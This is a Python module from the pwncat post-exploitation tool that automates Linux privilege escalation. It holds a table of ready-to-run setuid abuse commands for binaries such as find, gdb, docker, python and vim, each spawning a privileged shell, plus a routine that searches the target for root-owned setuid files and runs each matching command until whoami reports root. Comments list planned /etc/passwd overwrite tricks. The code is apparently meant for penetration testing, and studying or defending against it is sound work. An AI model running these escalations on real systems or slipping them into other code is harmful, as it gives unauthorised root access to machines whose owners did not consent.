#!/usr/bin/env python3
from typing import Generator, List
import shlex
import sys
from time import sleep
import os
from colorama import Fore, Style

from pwncat.util import info, success, error, progress, warn
from pwncat.privesc.base import Method, PrivescError, Technique

# https://gtfobins.github.io/#+suid
known_setuid_privescs = {
    "env": ["{} /bin/bash -p"],
    "bash": ["{} -p"],
    "chmod": ["{} +s /bin/bash", "/bin/bash -p"],
    "chroot": ["{} / /bin/bash -p"],
    "dash": ["{} -p"],
    "ash": ["{}"],
    "docker": ["{} run -v /:/mnt --rm -it alpine chroot /mnt sh"],
    "emacs": ["""{} -Q -nw --eval '(term "/bin/sh -p")'"""],
    "find": ["{} . -exec /bin/sh -p \\; -quit"],
    "flock": ["{} -u / /bin/sh -p"],
    "gdb": [
        """{} -nx -ex 'python import os; os.execl("/bin/bash", "bash", "-p")' -ex quit"""
    ],
    "logsave": ["{} /dev/null /bin/bash -i -p"],
    "make": ["COMMAND='/bin/sh -p'", """{} -s --eval=$'x:\\n\\t-'\"$COMMAND\"""",],
    "nice": ["{} /bin/bash -p"],
    "node": [
        """{} -e 'require("child_process").spawn("/bin/sh", ["-p"], {stdio: [0, 1, 2]});'"""
    ],
    "nohup": ["""{} /bin/sh -p -c \"sh -p <$(tty) >$(tty) 2>$(tty)\""""],
    "perl": ["""{} -e 'exec "/bin/sh";'"""],
    "php": ["""{} -r \"pcntl_exec('/bin/sh', ['-p']);\""""],
    "python": ["""{} -c 'import os; os.execl("/bin/sh", "sh", "-p")'"""],
    "rlwrap": ["{} -H /dev/null /bin/sh -p"],
    "rpm": ["""{} --eval '%{lua:os.execute("/bin/sh", "-p")}'"""],
    "rpmquery": ["""{} --eval '%{lua:posix.exec("/bin/sh", "-p")}'"""],
    "rsync": ["""{} -e 'sh -p -c "sh 0<&2 1>&2"' 127.0.0.1:/dev/null"""],
    "run-parts": ["""{} --new-session --regex '^sh$' /bin --arg='-p'"""],
    "rvim": [
        """{} -c ':py import os; os.execl("/bin/sh", "sh", "-pc", "reset; exec sh -p")'"""
    ],
    "setarch": ["""{} $(arch) /bin/sh -p"""],
    "start-stop-daemon": ["""{} -n $RANDOM -S -x /bin/sh -- -p"""],
    "strace": ["""{} -o /dev/null /bin/sh -p"""],
    "tclsh": ["""{}""", """exec /bin/sh -p <@stdin >@stdout 2>@stderr; exit"""],
    "tclsh8.6": ["""{}""", """exec /bin/sh -p <@stdin >@stdout 2>@stderr; exit""",],
    "taskset": ["""{} 1 /bin/sh -p"""],
    "time": ["""{} /bin/sh -p"""],
    "timeout": ["""{} 7d /bin/sh -p"""],
    "unshare": ["""{} -r /bin/sh"""],
    "vim": ["""{} -c ':!/bin/sh' -c ':q'"""],
    "watch": ["""{} -x sh -c 'reset; exec sh 1>&0 2>&0'"""],
    "zsh": ["""{}"""],
    # need to add in cp trick to overwrite /etc/passwd
    # need to add in curl trick to overwrite /etc/passwd
    # need to add in wget trick to overwrite /etc/passwd
    # need to add in dd trick to overwrite /etc/passwd
    # need to add in openssl trick to overwrite /etc/passwd
    # need to add in sed trick to overwrite /etc/passwd
    # need to add in shuf trick to overwrite /etc/passwd
    # need to add in systemctl trick to overwrite /etc/passwd
    # need to add in tee trick to overwrite /etc/passwd
    # need to add in wget trick to overwrite /etc/passwd
    # need to add in nano trick but requires Control+R Control+X keys
    # need to add in pico trick but requires Control+R Control+X keys
    # b"/bin/nano": ["/bin/nano", "\x12\x18reset; sh -p 1>&0 2>&0"],
}


class SetuidMethod(Method):

    name = "setuid"
    BINARIES = ["find"]

    def enumerate(self) -> List[Technique]:
        """ Find all techniques known at this time """

    def execute(self):
        """ Look for setuid binaries and attempt to run"""

        find = self.pty.which("find")

        setuid_output = []
        delim = self.pty.process(f"find / -user root -perm -4000 -print 2>/dev/null")

        while True:
            line = self.pty.recvuntil(b"\n").strip()
            progress("searching for setuid binaries")

            if delim in line:
                break
            setuid_output.append(line)

        for suid in setuid_output:
            suid = suid.decode("utf-8")
            for privesc, commands in known_setuid_privescs.items():
                if os.path.basename(suid) != privesc:
                    continue

                info(
                    f"attempting potential privesc with {Fore.GREEN}{Style.BRIGHT}{suid}{Fore.RESET}{Style.RESET_ALL}",
                )

                before_shell_level = self.pty.run("echo $SHLVL").strip()
                before_shell_level = (
                    int(before_shell_level) if before_shell_level != b"" else 0
                )

                for each_command in commands:
                    self.pty.run(each_command.format(suid), wait=False)

                sleep(0.1)
                user = self.pty.run("whoami").strip()
                if user == b"root":
                    success("privesc succeeded")
                    return True
                else:
                    error("privesc failed")
                    after_shell_level = self.pty.run("echo $SHLVL").strip()
                    after_shell_level = (
                        int(after_shell_level) if after_shell_level != b"" else 0
                    )
                    if after_shell_level > before_shell_level:
                        info("exiting spawned inner shell")
                        self.pty.run("exit", wait=False)  # here be dragons

                    continue

        error("no known setuid privescs found")

        return False
